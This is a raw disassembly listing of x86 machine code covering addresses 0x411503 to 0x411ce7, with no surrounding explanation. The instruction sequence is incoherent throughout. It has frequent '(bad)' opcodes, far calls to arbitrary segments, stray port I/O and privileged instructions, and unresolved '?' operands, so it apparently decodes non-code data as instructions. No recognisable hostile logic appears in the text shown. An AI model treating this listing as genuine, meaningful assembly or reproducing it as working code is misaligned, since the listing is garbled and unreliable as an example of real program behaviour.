  411503:	cwde   
  411504:	test   DWORD PTR [esi-0x66],edi
  411507:	test   DWORD PTR [edi],0x3efbe42d
  41150d:	jmp    0x299dce2c
  411512:	xor    ah,BYTE PTR [esi+esi*1]
  411515:	add    eax,0x5943aad5
  41151a:	mov    al,ds:0x9a53c477
  41151f:	cld    
  411520:	imul   edx,DWORD PTR [esi-0x191302cf],0xb465559
  41152a:	mov    ebp,0x1fbfc8f0
  41152f:	(bad)  
  411530:	fstp   st(3)
  411532:	call   0xc025:0x833904c
  411539:	xor    bh,BYTE PTR [ebx-0x323d59]
  41153f:	stos   DWORD PTR es:[edi],eax
  411540:	xor    eax,0xb29a8680
  411545:	out    dx,eax
  411546:	xchg   DWORD PTR [eax+edi*2],esp
  411549:	mov    cl,0xc3
  41154b:	pop    edi
  41154c:	imul   ecx,DWORD PTR [ebx],0x5d
  41154f:	mov    dl,ah
  411551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411552:	pusha  
  411553:	add    DWORD PTR [ecx+eax*1+0x5],ebp
  411557:	pop    edi
  411558:	sub    bl,bh
  41155a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41155c:	aas    
  41155d:	cld    
  41155e:	aad    0x90
  411560:	xor    al,dh
  411562:	cmp    esi,edx
  411564:	mov    dl,0x50
  411566:	mov    BYTE PTR [ebp+0x56],cl
  411569:	mov    bl,0x72
  41156b:	mov    al,0xf9
  41156d:	jno    0x411536
  41156f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411570:	push   ebp
  411571:	idiv   DWORD PTR [ecx-0x66de8782]
  411577:	xchg   edx,eax
  411578:	mov    dl,0x23
  41157a:	aad    0x47
  41157c:	test   al,dh
  41157e:	sub    BYTE PTR [edi+0x26],bl
  411581:	ss push edi
  411583:	ror    dl,0xb
  411586:	retf   0x17b9
  411589:	pop    ds
  41158a:	lock dec esi
  41158c:	out    0x8,al
  41158e:	call   0xaaf:0xec005545
  411595:	test   eax,0xbdc5f62
  41159a:	jmp    0x5bee:0xe6c904a5
  4115a1:	stos   BYTE PTR es:[edi],al
  4115a2:	in     al,0xe1
  4115a4:	mov    ch,0x5
  4115a6:	xchg   BYTE PTR [ebp-0x7200ac7b],dl
  4115ac:	xor    ah,BYTE PTR [esi+0xb0fc0bc]
  4115b2:	(bad)  
  4115b4:	sub    ah,BYTE PTR [edx]
  4115b6:	sbb    ebx,DWORD PTR [ebp+0x70]
  4115b9:	push   ds
  4115ba:	jle    0x411569
  4115bc:	mov    dl,0x80
  4115be:	push   eax
  4115bf:	mov    al,0xe9
  4115c1:	outs   dx,DWORD PTR ds:[esi]
  4115c2:	and    eax,0xce15f7c9
  4115c7:	in     al,dx
  4115c8:	mov    ah,0x48
  4115ca:	int3   
  4115cb:	sbb    al,0x96
  4115cd:	popf   
  4115ce:	add    dl,BYTE PTR [ecx]
  4115d0:	xor    al,0xa
  4115d2:	in     al,dx
  4115d3:	push   0x9d7ecab2
  4115d8:	add    dh,bh
  4115da:	mov    cl,0x3d
  4115dc:	jg     0x4115e9
  4115de:	mov    esp,edi
  4115e0:	or     DWORD PTR cs:0x94588135,0xffffffe7
  4115e8:	jne    0x4115a0
  4115ea:	xor    DWORD PTR [edi],esp
  4115ec:	mov    ?,WORD PTR [eax]
  4115ee:	shl    BYTE PTR ds:0xa7269b48,1
  4115f4:	sub    dh,BYTE PTR [eax+ecx*8]
  4115f7:	sub    eax,0x3c4c6e4c
  4115fc:	mov    dl,0x42
  4115fe:	xor    ch,bh
  411600:	test   ecx,esp
  411602:	mov    dh,0xe0
  411604:	rcl    DWORD PTR [eax+ebx*1],cl
  411607:	push   ss
  411608:	call   0xc904:0x4dca78cb
  41160f:	popa   
  411610:	mov    dl,0xc9
  411612:	rol    BYTE PTR [edx],1
  411614:	sbb    eax,0xed51bb7b
  411619:	or     ebp,DWORD PTR [eax+0x3e2e953c]
  41161f:	xchg   esi,eax
  411620:	or     eax,DWORD PTR [edx+0x6b227f99]
  411626:	sub    al,0x4
  411628:	ja     0x411615
  41162a:	jno    0x41166b
  41162c:	das    
  41162d:	adc    al,0x94
  41162f:	mov    ds:0x368675df,eax
  411634:	and    al,0x8b
  411636:	and    al,0xb1
  411638:	addr16 test edx,esp
  41163b:	dec    ecx
  41163c:	mov    dl,0x5c
  41163e:	sbb    eax,0x3ceb6d6b
  411643:	inc    eax
  411644:	sub    BYTE PTR [edi],dl
  411646:	dec    ecx
  411647:	cmp    BYTE PTR ds:0xa269b70e,dl
  41164d:	or     edi,DWORD PTR [edi-0x62]
  411650:	imul   ebp,DWORD PTR [eax-0x64],0x1fedb51b
  411657:	jg     0x411602
  411659:	or     dl,bh
  41165b:	push   cs
  41165c:	std    
  41165d:	lods   al,BYTE PTR ds:[esi]
  41165e:	mov    esp,DWORD PTR [ecx-0x4d5abf64]
  411664:	xor    al,0x3d
  411666:	or     cl,BYTE PTR [edx+esi*4-0x1d3dce21]
  41166d:	mov    al,0xcd
  41166f:	adc    al,0xcf
  411671:	or     al,0x99
  411673:	pop    ebp
  411674:	shl    BYTE PTR [ecx+ebp*8-0x20],0x2e
  411679:	sbb    edx,DWORD PTR [eax+esi*1-0xd7a0742]
  411680:	sbb    al,ch
  411682:	dec    eax
  411683:	mov    BYTE PTR [edx],dh
  411685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411686:	rcl    bh,1
  411688:	inc    edx
  411689:	or     eax,DWORD PTR [ecx-0x276cca32]
  41168f:	mov    dl,0xc8
  411691:	ficomp WORD PTR [edx+0x68c581b5]
  411697:	(bad)  [edi+0x3]
  41169a:	fsub   QWORD PTR [edi-0x6eefb077]
  4116a0:	dec    esi
  4116a1:	xor    al,0x5e
  4116a3:	iret   
  4116a4:	mov    dl,0xb2
  4116a6:	icebp  
  4116a7:	adc    BYTE PTR [edx-0x65e0f2d8],cl
  4116ad:	or     ecx,DWORD PTR [ebx-0x51]
  4116b0:	inc    edx
  4116b1:	mov    bh,0xf6
  4116b3:	mov    cl,0x7f
  4116b5:	inc    esi
  4116b6:	call   0xc508:0x817ff701
  4116bd:	mov    cl,0xf8
  4116bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c0:	ficomp DWORD PTR [esi]
  4116c2:	test   al,0x9f
  4116c4:	mov    esp,0x8b4ff32b
  4116c9:	or     BYTE PTR [edx-0x59],ch
  4116cc:	lahf   
  4116cd:	inc    esp
  4116ce:	inc    esp
  4116cf:	mov    al,0xb
  4116d1:	icebp  
  4116d2:	fwait
  4116d3:	dec    ebx
  4116d4:	ror    BYTE PTR [ebx],0xe9
  4116d7:	in     al,0x67
  4116d9:	mov    ?,ebp
  4116db:	fnstenv [ecx]
  4116dd:	call   0x24fa:0xb8fb
  4116e3:	push   es
  4116e4:	jp     0x411720
  4116e6:	dec    esi
  4116e7:	fucomi st,st(5)
  4116e9:	or     bh,bl
  4116eb:	cmp    eax,ebx
  4116ed:	test   eax,0xab6d0a3c
  4116f2:	jno    0x411691
  4116f4:	out    dx,eax
  4116f5:	xchg   edx,eax
  4116f6:	xchg   BYTE PTR [ecx-0x3025cb55],ah
  4116fc:	fst    QWORD PTR [eax+0x36a266f3]
  411702:	arpl   WORD PTR [ebx-0x361911ce],bp
  411708:	sbb    ebp,DWORD PTR [esi+0x1e]
  41170b:	mov    dh,0xbc
  41170d:	xchg   ebp,eax
  41170e:	mov    ebp,0x248b5b10
  411713:	xlat   BYTE PTR ds:[ebx]
  411714:	clc    
  411715:	add    BYTE PTR [esi+ebx*4],bl
  411718:	jmp    0x411701
  41171a:	sbb    dl,bl
  41171c:	and    al,al
  41171e:	jnp    0x411743
  411720:	popa   
  411721:	push   ds
  411722:	call   0x9fce:0x739467eb
  411729:	or     DWORD PTR [ecx-0x58],ebp
  41172c:	fistp  WORD PTR [edi]
  41172e:	pop    esi
  41172f:	jns    0x411723
  411731:	mov    edi,DWORD PTR ds:0xa2136973
  411737:	test   BYTE PTR [edx-0x68],ch
  41173a:	shl    bl,0xb2
  41173d:	mov    bl,BYTE PTR [eax+edx*8]
  411740:	add    DWORD PTR [ebp-0x793e5805],0x60
  411747:	fisub  DWORD PTR [ebp-0x5e60a5c8]
  41174d:	and    ah,BYTE PTR [eax]
  41174f:	cmp    eax,0xbb563eb2
  411754:	inc    esp
  411755:	pop    ecx
  411756:	adc    esp,DWORD PTR [edi+0x70947da4]
  41175c:	and    al,0x8f
  41175e:	xchg   ebp,eax
  41175f:	adc    al,0x12
  411761:	lock out 0xcd,al
  411764:	scas   eax,DWORD PTR es:[edi]
  411765:	js     0x41178b
  411767:	xchg   ebp,eax
  411768:	repnz xor ebp,DWORD PTR [ecx-0x6494701c]
  41176f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411770:	or     eax,0x4f6eea0d
  411775:	add    bh,dh
  411777:	sub    DWORD PTR [edx-0x7df35125],esi
  41177d:	and    al,0xc8
  41177f:	(bad)  
  411780:	fisubr WORD PTR [edi]
  411782:	pop    esi
  411783:	mov    edx,0xdea20b55
  411788:	dec    esp
  411789:	fwait
  41178a:	and    edx,ebx
  41178c:	mov    dl,0xf1
  41178e:	jnp    0x411717
  411790:	mov    ebp,0x6009b5a7
  411795:	add    al,0x72
  411797:	and    al,0x1
  411799:	adc    ebx,DWORD PTR [edx+0x6de297f7]
  41179f:	arpl   WORD PTR [esi-0x42a44e56],dx
  4117a5:	dec    ebp
  4117a6:	xacquire xchg DWORD PTR [edi],eax
  4117a9:	jae    0x4117a9
  4117ab:	adc    ebp,DWORD PTR [ebp+eax*1-0x46]
  4117af:	aas    
  4117b0:	mov    ebp,0xe4065a91
  4117b5:	ret    
  4117b6:	lahf   
  4117b7:	sti    
  4117b8:	mov    dl,0x3c
  4117ba:	inc    ecx
  4117bb:	lds    eax,FWORD PTR [eax-0xc]
  4117be:	sub    BYTE PTR [edi+0xf5e0b2f],dl
  4117c4:	mov    ds:0xa8f78fb6,eax
  4117c9:	cs call 0xb3d1:0xf1441748
  4117d1:	cdq    
  4117d2:	mov    bl,BYTE PTR [edi+0x771b1dd2]
  4117d8:	mov    edi,fs
  4117da:	and    edi,DWORD PTR [ebx]
  4117dc:	push   ecx
  4117dd:	sti    
  4117de:	pop    es
  4117df:	out    dx,al
  4117e0:	mov    dl,0x64
  4117e2:	or     edi,esi
  4117e4:	stos   DWORD PTR es:[edi],eax
  4117e5:	in     eax,dx
  4117e6:	mov    esp,0x70303968
  4117eb:	add    dh,BYTE PTR [edx]
  4117ed:	push   edi
  4117ee:	arpl   WORD PTR [ebx],dx
  4117f0:	scas   al,BYTE PTR es:[edi]
  4117f1:	cs pop es
  4117f3:	sub    DWORD PTR [edx+0x55d5cbce],esi
  4117f9:	mov    bl,0x37
  4117fb:	mov    esi,fs
  4117fd:	or     eax,ebp
  4117ff:	jno    0x4117c9
  411801:	mov    ?,WORD PTR [edi+0x664dde47]
  411807:	arpl   WORD PTR [edx+0x829607a],si
  41180d:	ja     0x4117a3
  41180f:	push   ss
  411810:	out    0xb,eax
  411812:	mov    eax,ds:0xfc7037e0
  411817:	stc    
  411818:	mov    cl,0x2
  41181a:	cli    
  41181b:	mov    ds:0x707c2c4a,eax
  411820:	push   ecx
  411821:	adc    eax,0x8b4ff370
  411826:	inc    edi
  411827:	mov    ah,0x67
  411829:	mov    BYTE PTR [ecx],ah
  41182b:	(bad)  
  41182c:	mov    dl,0xe7
  41182e:	shr    ch,cl
  411830:	int3   
  411831:	jns    0x4118b1
  411833:	imul   esp,DWORD PTR ds:0x61e5ce0b,0x332a7305
  41183d:	clc    
  41183e:	call   0x7877:0x917e8f92
  411845:	xor    al,0xf4
  411847:	mov    ecx,0x267296aa
  41184c:	les    ebp,FWORD PTR [edx]
  41184e:	int3   
  41184f:	jnp    0x41184b
  411851:	rcl    DWORD PTR [edx+0x79],cl
  411854:	mov    dl,0x87
  411856:	sub    cl,al
  411858:	dec    eax
  411859:	adc    eax,ecx
  41185b:	push   es
  41185c:	aaa    
  41185d:	pandn  mm7,QWORD PTR [ecx]
  411860:	data16 std 
  411862:	jns    0x411884
  411864:	jne    0x41185e
  411866:	cmp    BYTE PTR [edi+0x3a],dl
  411869:	inc    esp
  41186a:	mov    ebx,0x6dd9b2cf
  41186f:	pop    ds
  411870:	es stc 
  411872:	dec    edi
  411873:	pop    ebx
  411874:	sub    al,0xb
  411876:	cmp    DWORD PTR [edi+0x1f],esi
  411879:	add    eax,0xd1122725
  41187e:	call   0xda41:0xba213ddd
  411885:	es mov ah,0x51
  411888:	bound  esp,QWORD PTR [esi]
  41188a:	(bad)  
  41188b:	imul   eax,DWORD PTR [edx-0x33],0xffffff94
  41188f:	xor    bh,BYTE PTR [ebp-0x12184014]
  411895:	cmp    BYTE PTR [ebx-0x15],al
  411898:	retf   
  411899:	jg     0x4118b9
  41189b:	sar    BYTE PTR [edx-0x15],cl
  41189e:	cli    
  41189f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118a0:	inc    ebp
  4118a1:	mov    dh,al
  4118a3:	inc    ebx
  4118a4:	pop    ds
  4118a5:	sbb    dl,BYTE PTR [ebx+eiz*4]
  4118a8:	lea    esi,[edi+0x14f82021]
  4118ae:	xchg   ecx,eax
  4118af:	cmp    dl,ah
  4118b1:	jo     0x4118e3
  4118b3:	mov    ecx,0xe8610b3b
  4118b8:	add    bl,BYTE PTR [edx]
  4118ba:	pop    ss
  4118bb:	inc    edx
  4118bc:	xlat   BYTE PTR ds:[ebx]
  4118bd:	sub    al,0x91
  4118bf:	cmp    eax,0xa7c6959c
  4118c4:	sbb    BYTE PTR [esi],ch
  4118c6:	dec    edi
  4118c7:	jne    0x4118e3
  4118c9:	or     al,0x47
  4118cb:	jae    0x41185d
  4118cd:	jmp    0x1a68e0a0
  4118d2:	and    al,0xd0
  4118d4:	mov    ch,0xe
  4118d6:	mov    DWORD PTR ds:0xb9ca16c2,0x986fa070
  4118e0:	dec    edi
  4118e1:	dec    edx
  4118e2:	call   0xef04:0x5d17e727
  4118e9:	retf   0x1d9d
  4118ec:	inc    ebx
  4118ed:	inc    eax
  4118ee:	cwde   
  4118ef:	imul   esi,edx,0x7bbd2ece
  4118f5:	pop    ss
  4118f6:	test   eax,0xe255e3ab
  4118fb:	addr16 out 0x1f,al
  4118fe:	or     bl,BYTE PTR [edi-0x26651957]
  411904:	out    dx,eax
  411905:	in     al,0x4d
  411907:	xor    eax,0xa75f4a35
  41190c:	fcomi  st,st(3)
  41190e:	sub    DWORD PTR [esi-0x5ba3803e],esp
  411914:	and    dh,ch
  411916:	call   0x4bdd:0x6aa03908
  41191d:	test   ah,0x59
  411920:	into   
  411921:	add    eax,0x14f9904a
  411926:	std    
  411927:	ins    BYTE PTR es:[edi],dx
  411928:	cmc    
  411929:	jnp    0x411982
  41192b:	daa    
  41192c:	dec    edx
  41192d:	mov    ebp,0x21544cfa
  411932:	mov    al,ds:0x690b2ab0
  411937:	lahf   
  411938:	and    eax,0x4f2bf396
  41193d:	pop    ss
  41193e:	call   0xab4:0x12556117
  411945:	jnp    0x411973
  411947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411948:	xchg   esi,eax
  411949:	xchg   ecx,eax
  41194a:	sub    eax,DWORD PTR [ebx-0x3a]
  41194d:	fidiv  DWORD PTR [esi]
  41194f:	arpl   WORD PTR [edi-0x2f0f64d9],bx
  411955:	int    0x5f
  411957:	fsubr  DWORD PTR [edi]
  411959:	addr16 dec ebx
  41195b:	jg     0x4119a4
  41195d:	ds inc edx
  41195f:	imul   esi,DWORD PTR [ebx+ecx*1],0x224a1418
  411966:	out    dx,eax
  411967:	test   DWORD PTR [edi],0x4d9ea365
  41196d:	mov    DWORD PTR [ebx-0x4b],ebp
  411970:	pop    esi
  411971:	jg     0x411954
  411973:	(bad)  
  411974:	cmp    al,0xcb
  411976:	xchg   ebp,eax
  411977:	mov    edx,0xe721f902
  41197c:	add    BYTE PTR [edx+0x57f809a4],cl
  411982:	xchg   esp,eax
  411983:	mov    bl,0x3b
  411985:	adc    DWORD PTR [ebp+0x27],ecx
  411988:	(bad)  
  411989:	lock push ds
  41198b:	sar    DWORD PTR [esp+esi*1],cl
  41198e:	mov    bh,0x6c
  411990:	mov    dl,0xa8
  411992:	mov    esi,ebx
  411994:	fild   WORD PTR [eax-0x604d9e39]
  41199a:	cmc    
  41199b:	or     DWORD PTR [esi-0x1d],edi
  41199e:	iret   
  41199f:	je     0x411951
  4119a1:	or     eax,esi
  4119a3:	shl    DWORD PTR [bp+di+0x2482],1
  4119a8:	jl     0x4119fc
  4119aa:	call   0xfa66:0xe70144b3
  4119b1:	outs   dx,DWORD PTR ds:[esi]
  4119b2:	pop    ecx
  4119b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b4:	mov    al,ds:0xfe0da4fb
  4119b9:	add    DWORD PTR [esi],0xffffffbf
  4119bc:	mov    dl,0x10
  4119be:	mov    es,WORD PTR [edx]
  4119c0:	sbb    bh,BYTE PTR ds:0x4fb66d0
  4119c6:	clc    
  4119c7:	inc    ecx
  4119c8:	mov    esi,0xacd15a9b
  4119cd:	aaa    
  4119ce:	xchg   DWORD PTR ds:0x535f12b2,ecx
  4119d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d5:	jp     0x4119a3
  4119d7:	jge    0x4119da
  4119d9:	or     DWORD PTR [ebp+0x21fb8d66],edi
  4119df:	xor    BYTE PTR [edx],0x97
  4119e2:	xchg   ebp,eax
  4119e3:	cdq    
  4119e4:	test   DWORD PTR [eax+0x45ca5593],esp
  4119ea:	stos   BYTE PTR es:[edi],al
  4119eb:	daa    
  4119ec:	jmp    0x398ecb3d
  4119f1:	repz je 0x4119a8
  4119f4:	fld    st(0)
  4119f6:	cmp    eax,0x5a286fa9
  4119fb:	inc    edi
  4119fc:	adc    dl,dl
  4119fe:	in     eax,dx
  4119ff:	push   ebp
  411a00:	mov    dl,0xff
  411a02:	push   cs
  411a03:	ror    DWORD PTR [esi],0x8a
  411a06:	jns    0x4119ad
  411a08:	imul   esp,ebx,0xb2dd3c4
  411a0e:	or     bl,BYTE PTR [edx]
  411a10:	mov    ch,0xa4
  411a12:	adc    edi,DWORD PTR ds:0xd193d853
  411a18:	push   ds
  411a19:	and    BYTE PTR [ecx],0xa7
  411a1c:	test   BYTE PTR ds:0x195bfdbc,dh
  411a22:	aad    0xaf
  411a24:	je     0x4119e1
  411a26:	xlat   BYTE PTR ds:[ebx]
  411a27:	cli    
  411a28:	shl    DWORD PTR [edi-0x77],0x69
  411a2c:	pop    edx
  411a2d:	fcomp  DWORD PTR [edx-0x4ad76984]
  411a33:	ds cmp al,0x8
  411a36:	fwait
  411a37:	add    eax,0xbb6e98d1
  411a3c:	push   edx
  411a3d:	jbe    0x4119df
  411a3f:	or     BYTE PTR [esi-0x3c],0x9a
  411a43:	cmp    al,0xd2
  411a45:	div    BYTE PTR [edx+0x2e]
  411a48:	cmp    al,BYTE PTR [ecx+0x25]
  411a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a4c:	sub    al,0x50
  411a4e:	leave  
  411a4f:	mov    cl,0x58
  411a51:	pop    esp
  411a52:	shl    edx,1
  411a54:	lods   al,BYTE PTR ds:[esi]
  411a55:	ret    0x3256
  411a58:	jb     0x411a8d
  411a5a:	dec    eax
  411a5b:	pop    ds
  411a5c:	sahf   
  411a5d:	cmp    DWORD PTR [edi-0x59],edi
  411a60:	push   ss
  411a61:	sub    ah,BYTE PTR [ecx+eiz*4]
  411a64:	enter  0xf5a4,0x3a
  411a68:	mov    ebp,0x2dcb2cb6
  411a6d:	jmp    0x411a37
  411a6f:	push   cs
  411a70:	push   0x4a
  411a72:	cmp    esp,DWORD PTR [edi+0x2b10a63d]
  411a78:	pop    ecx
  411a79:	and    ecx,DWORD PTR [ecx-0x3f]
  411a7c:	mov    dl,0xc6
  411a7e:	mov    ecx,0x535b68b4
  411a83:	repnz aad 0xb
  411a86:	or     edx,edx
  411a88:	mov    ah,0xe5
  411a8a:	pop    edx
  411a8b:	push   es
  411a8c:	rcl    edx,cl
  411a8e:	and    ah,BYTE PTR ds:0xb79a8602
  411a94:	jl     0x411ac2
  411a96:	mov    ebx,0xa9134c2b
  411a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a9c:	mov    WORD PTR [esi-0x40],?
  411a9f:	cmp    edi,DWORD PTR [ebx-0x4dd6e764]
  411aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa7:	lods   al,BYTE PTR ds:[esi]
  411aa8:	jns    0x411ad2
  411aaa:	rcr    DWORD PTR [edx-0x6c2df48f],1
  411ab0:	and    DWORD PTR [esi+edi*8+0x28],ebp
  411ab4:	sbb    BYTE PTR [edi-0x11a3cc66],dh
  411aba:	sbb    BYTE PTR [ecx-0x586407f8],cl
  411ac0:	xchg   ecx,eax
  411ac1:	fs push edi
  411ac3:	cs aad 0x83
  411ac6:	mov    eax,ds:0x8662b270
  411acb:	test   eax,0xfaca2e7b
  411ad0:	pop    ds
  411ad1:	cmc    
  411ad2:	pop    edi
  411ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ad4:	jae    0x411a9a
  411ad6:	into   
  411ad7:	mov    edx,0x97fde190
  411adc:	xchg   ecx,eax
  411add:	loopne 0x411a82
  411adf:	jp     0x411b4f
  411ae1:	or     ebp,DWORD PTR [ebp+0x6a5327dd]
  411ae7:	lahf   
  411ae8:	cdq    
  411ae9:	or     esi,DWORD PTR [ebp+0x7c]
  411aec:	ror    DWORD PTR ds:0x29646a7e,0x9a
  411af3:	scas   al,BYTE PTR es:[edi]
  411af4:	leave  
  411af5:	lds    ecx,FWORD PTR [ecx-0x6b]
  411af8:	rcl    BYTE PTR [ebx],cl
  411afa:	js     0x411aa3
  411afc:	xrelease xchg DWORD PTR [esi-0x47],edx
  411b00:	fidiv  WORD PTR [eax+0x7fb2f602]
  411b06:	xchg   esi,eax
  411b07:	or     BYTE PTR [eax],0xaa
  411b0a:	adc    bh,BYTE PTR [ebp+0x11860b90]
  411b10:	mov    ds:0x48311d2a,al
  411b15:	fwait
  411b16:	xchg   DWORD PTR [ebx+esi*1],ecx
  411b19:	ficomp WORD PTR [edx+0x2]
  411b1c:	jmp    DWORD PTR [ecx]
  411b1e:	xchg   esp,eax
  411b1f:	xlat   BYTE PTR ds:[ebx]
  411b20:	inc    ebp
  411b21:	or     esp,DWORD PTR [eax]
  411b23:	cmp    ax,0xd857
  411b27:	xchg   ebx,eax
  411b28:	(bad)  
  411b29:	test   eax,0x7a03ce86
  411b2e:	dec    eax
  411b2f:	push   ds
  411b30:	mov    dl,0x45
  411b32:	jae    0x411bb0
  411b34:	cmc    
  411b35:	fs imul edx,ecx,0xffffffb4
  411b39:	push   ebx
  411b3a:	aam    0x9c
  411b3c:	mov    dl,0x72
  411b3e:	jmp    0x411ae6
  411b40:	mov    cl,0x14
  411b42:	pop    esp
  411b43:	stos   BYTE PTR es:[edi],al
  411b44:	scas   al,BYTE PTR es:[edi]
  411b45:	out    0xe5,eax
  411b47:	(bad)  
  411b48:	mov    dl,0x4
  411b4a:	inc    ebx
  411b4b:	dec    esi
  411b4c:	nop
  411b4d:	sar    BYTE PTR [ebx+0x169b52a6],1
  411b53:	mov    edi,0x444da154
  411b58:	or     al,BYTE PTR [ebx]
  411b5a:	std    
  411b5b:	scas   al,BYTE PTR es:[edi]
  411b5c:	mov    dl,0xfd
  411b5e:	imul   BYTE PTR [ebp+0x7ec340fb]
  411b64:	sbb    DWORD PTR ds:0x4ba6e11d,edx
  411b6a:	xchg   esp,eax
  411b6b:	mov    edx,DWORD PTR [ecx]
  411b6d:	imul   esp,ebp,0x41
  411b70:	mov    dl,0x43
  411b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b73:	xor    al,cl
  411b75:	push   cs
  411b76:	les    esp,FWORD PTR [eax]
  411b78:	ss xor esp,ebx
  411b7b:	push   edi
  411b7c:	xor    al,BYTE PTR [eax]
  411b7e:	fimul  DWORD PTR [edx]
  411b80:	xchg   edi,eax
  411b81:	dec    esi
  411b82:	pop    es
  411b83:	test   al,0xb6
  411b85:	jns    0x411b0c
  411b87:	pop    ebp
  411b88:	loop   0x411bfd
  411b8a:	sbb    ch,bh
  411b8c:	and    ch,dh
  411b8e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  411b90:	ds dec edi
  411b92:	(bad)  
  411b93:	ins    DWORD PTR es:[edi],dx
  411b94:	xor    eax,0xe18fa81
  411b99:	pop    eax
  411b9a:	cdq    
  411b9b:	adc    DWORD PTR [esp+ebx*8-0x4b],edi
  411b9f:	add    eax,0xdf9f9b77
  411ba4:	(bad)  
  411ba5:	cmc    
  411ba6:	fs scas al,BYTE PTR es:[edi]
  411ba8:	loopne 0x411b66
  411baa:	jmp    DWORD PTR [eax]
  411bac:	xor    bh,BYTE PTR [eax]
  411bae:	ja     0x411bca
  411bb0:	les    edi,FWORD PTR [edx]
  411bb2:	call   0x5684:0x79e1e9ed
  411bb9:	cmp    al,0xae
  411bbb:	fstp   DWORD PTR [ecx+0xb]
  411bbe:	jmp    0x411b87
  411bc0:	xchg   ebx,eax
  411bc1:	sub    al,0x57
  411bc3:	jmp    0xe0dc696d
  411bc8:	mov    edx,0x222743a7
  411bcd:	fst    QWORD PTR [esi-0x4d]
  411bd0:	and    ecx,DWORD PTR [ebx]
  411bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bd3:	addr16 mov ah,0x36
  411bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd7:	clc    
  411bd8:	pop    edi
  411bd9:	lock call 0x5579:0x365f65cb
  411be1:	adc    eax,0xaf73a608
  411be6:	push   edx
  411be7:	sub    ch,BYTE PTR ds:0x216400d8
  411bed:	imul   edx,DWORD PTR [edx+0x49],0x39a5ec59
  411bf4:	lods   eax,DWORD PTR ds:[esi]
  411bf5:	or     esp,DWORD PTR [ebp-0x456697f5]
  411bfb:	push   esi
  411bfc:	lock or ebp,esp
  411bff:	jg     0x411c07
  411c01:	xchg   BYTE PTR [eax],ah
  411c03:	unpckhps xmm3,XMMWORD PTR [ebx*4-0x4cc14407]
  411c0b:	mov    BYTE PTR [ebx+0x46e8f0f4],dl
  411c11:	mov    ds:0x1f1ef22,al
  411c16:	call   0xb924:0xebcbb5dc
  411c1d:	addr16 call 0xeeb2:0xcdadb3c0
  411c25:	push   ebx
  411c26:	sbb    eax,0x32e551a7
  411c2b:	ret    0xfe8
  411c2e:	lea    eax,[ecx-0x3f388e62]
  411c34:	mov    dl,0x3
  411c36:	lds    esp,FWORD PTR [esi+0x7e]
  411c39:	cmp    dl,BYTE PTR [edx]
  411c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c3c:	lods   al,BYTE PTR ds:[esi]
  411c3d:	or     DWORD PTR [ebx],edi
  411c3f:	sub    DWORD PTR [ebx-0x3a4e5f11],0xffffffc9
  411c46:	jl     0x411c3d
  411c48:	and    ah,bl
  411c4a:	call   0x6baf:0x23564833
  411c51:	lods   eax,DWORD PTR ds:[esi]
  411c52:	xor    DWORD PTR [edi+0x55737c9a],esp
  411c58:	sti    
  411c59:	xchg   edi,eax
  411c5a:	icebp  
  411c5b:	(bad)  
  411c5c:	mov    ebp,0xc24766b8
  411c61:	mov    ecx,DWORD PTR [edx-0xdc9eb2a]
  411c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c68:	mov    al,0x6b
  411c6a:	enter  0xe1ef,0xc7
  411c6e:	nop
  411c6f:	jmp    0x411c5f
  411c71:	adc    al,0xa7
  411c74:	int    0xf3
  411c76:	out    dx,al
  411c77:	in     al,0xdf
  411c79:	sbb    DWORD PTR [ecx],edi
  411c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c7c:	rcl    DWORD PTR [ebx+0x44],cl
  411c7f:	loope  0x411c07
  411c81:	adc    BYTE PTR [edx+0xc],bl
  411c84:	mov    dl,0xf7
  411c86:	aaa    
  411c87:	inc    esi
  411c88:	mov    cl,0x1
  411c8a:	ins    BYTE PTR es:[edi],dx
  411c8b:	dec    esi
  411c8c:	jno    0x411c7b
  411c8e:	popf   
  411c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c90:	mov    ds:0xeff64680,al
  411c95:	mov    ebx,0x5cb2d616
  411c9a:	add    al,cl
  411c9c:	pop    DWORD PTR [ebx+0xb0a9407]
  411ca2:	enter  0x743,0xde
  411ca6:	mov    eax,0x94f74c6a
  411cab:	mov    al,dh
  411cad:	(bad)  
  411cae:	clc    
  411caf:	xchg   eax,ecx
  411cb1:	or     al,BYTE PTR [ebp-0x1b]
  411cb4:	push   es
  411cb5:	imul   ebp,esp,0x65
  411cb8:	ret    
  411cb9:	ins    DWORD PTR es:[edi],dx
  411cba:	cdq    
  411cbb:	int3   
  411cbc:	mov    ch,0xf8
  411cbe:	sbb    ch,ch
  411cc0:	mov    ecx,0x17bf9af5
  411cc5:	fs adc al,0xa5
  411cc8:	xchg   esp,eax
  411cc9:	jmp    0x722d02c6
  411cce:	out    dx,eax
  411ccf:	daa    
  411cd0:	add    BYTE PTR [edx+0x10],ah
  411cd3:	xchg   DWORD PTR [esi+0xa],ebp
  411cd6:	icebp  
  411cd7:	popf   
  411cd8:	pcmpeqb mm0,QWORD PTR [ebp-0x51]
  411cdc:	jne    0x411ca5
  411cde:	hlt    
  411cdf:	sbb    BYTE PTR [edx-0x6ce0820],dh
  411ce5:	icebp  
  411ce6:	inc    esi
  411ce7:	pop    ds
